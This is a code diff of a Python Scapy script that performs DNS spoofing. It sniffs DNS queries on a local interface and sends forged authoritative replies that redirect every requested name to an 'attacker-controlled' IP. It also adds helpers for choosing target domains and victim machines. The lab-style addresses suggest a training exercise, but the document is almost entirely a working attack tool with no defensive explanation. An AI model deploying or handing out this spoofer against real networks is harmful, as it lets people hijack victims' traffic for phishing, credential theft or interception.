@@ -1,53 +1,68 @@
+
 from scapy.all import *
 from scapy.layers.dns import DNS, DNSQR, DNSRR
 from scapy.layers.inet import IP, UDP
-import threading
 
-class DNSSpoofer(threading.Thread):
-    def __init__(self, interface, redirect_ip):
-        # Start thread and store basic setup
-        super().__init__()
-        self.interface = interface
-        self.redirect_ip = redirect_ip
-        self._stop = threading.Event()  # Used to stop the thread
+# Attacker-controlled IP (the fake answer target)
+redirect_ip = "192.168.56.103"
 
-    def stop(self):
-        # stop the loop
-        self._stop.set()
+# process and respond to DNS queries
+def handle_dns_packet(packet):
+    if packet.haslayer(DNS) and packet[DNS].qr == 0:  # DNS query
+        query_name = packet[DNSQR].qname.decode().rstrip('.')
+        print(f"[+] Intercepted DNS request for: {query_name}")
 
-    def is_stopped(self):
-        return self._stop.is_set()
+        # spoofed DNS response
+        spoofed_pkt = IP(src=packet[IP].dst, dst=packet[IP].src) / \
+                      UDP(sport=packet[UDP].dport, dport=packet[UDP].sport) / \
+                      DNS(
+                          id=packet[DNS].id,
+                          qr=1,
+                          aa=1,
+                          qd=packet[DNS].qd,
+                          an=DNSRR(rrname=packet[DNSQR].qname, rdata=redirect_ip)
+                      )
 
-    def run(self):
-        # listens for DNS queries and crafts spoofed replies
-        def process(packet):
-            # respond to DNS queries (qr=0)
-            if packet.haslayer(DNS) and packet[DNS].qr == 0:
-                query = packet[DNSQR].qname.decode().rstrip(".")
-                print(f"[*] Intercepted DNS query: {query}")
+        send(spoofed_pkt, verbose=False)
+        print(f"[+] Sent spoofed DNS response to {packet[IP].src}")
 
-                # send spoofed DNS response
-                fake = self._craft_response(packet)
-                send(fake, iface=self.interface, verbose=False)
+# test 
+if __name__ == "__main__":
+    interface = "enp0s3"  # network interface
 
-        # loop until stopped 
-        while not self.is_stopped():
-            sniff(
-                filter="udp port 53",
-                prn=process,
-                iface=self.interface,
-                store=0,
-                timeout=1
-            )
+    print("[*] Starting DNS spoof test. Press CTRL+C to stop.")
+    try:
+        sniff(
+            filter="udp port 53",
+            iface=interface,
+            prn=handle_dns_packet,
+            store=0
+        )
+    except KeyboardInterrupt:
+        print("\n[!] Test stopped.")
 
-    def _craft_response(self, pkt):
-        # return a forged DNS answer to redirect_ip
-        return IP(src=pkt[IP].dst, dst=pkt[IP].src) / \
-               UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) / \
-               DNS(
-                   id=pkt[DNS].id,
-                   qr=1,
-                   aa=1,
-                   qd=pkt[DNS].qd,
-                   an=DNSRR(rrname=pkt[DNSQR].qname, rdata=self.redirect_ip)
-               )
+
+# Function to check if the DNS query matches the target domain
+def is_target_domain(query_name, target_domains):
+    """
+    Check if the DNS query matches any domain in the target list.
+
+    query_name: The domain name from the DNS query (str)
+    target_domains: List of domains to spoof (list of str)
+    """
+    if not target_domains:
+        return True  # Spoof all domains if list is empty
+    return query_name in target_domains
+
+# Function to check if the DNS query comes from a target victim IP
+def is_target_victim(src_ip, target_ips):
+    """
+    Check if the source IP of the DNS query matches any IP in the target list.
+
+    src_ip: The source IP address from the DNS query (str)
+    target_ips: List of victim IPs to spoof (list of str)
+
+    """
+    if not target_ips:
+        return True  # Spoof all victims if list is empty
+    return src_ip in target_ips
